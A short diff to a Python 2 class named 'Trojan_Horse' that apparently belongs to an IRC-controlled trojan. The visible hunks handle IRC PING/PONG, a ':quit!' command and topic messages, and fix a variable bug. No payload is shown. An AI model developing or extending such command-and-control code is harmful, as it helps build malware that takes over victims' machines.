@@ -62,7 +62,7 @@ class Trojan_Horse():
                 for line in temp:
                     line=line.rstrip()
                     line=line.split()
-                    print line
+                    #print line
                     # The IRC table tennis 
                     if(line[0]=="PING"):
                         s.send("PONG %s\r\n" % line[1])
@@ -105,7 +105,8 @@ class Trojan_Horse():
                     if line[1] == "PRIVMSG" and line[3] == ":quit!":
                         s.close()
                         closed = 1
-                    if input[1] == "TOPIC":
+                    if line[1] == "TOPIC":
+                        print line
                         print "got topic"
             except socket.error, e:
                 print "Error: %s while connecting to the IRC server!" % e
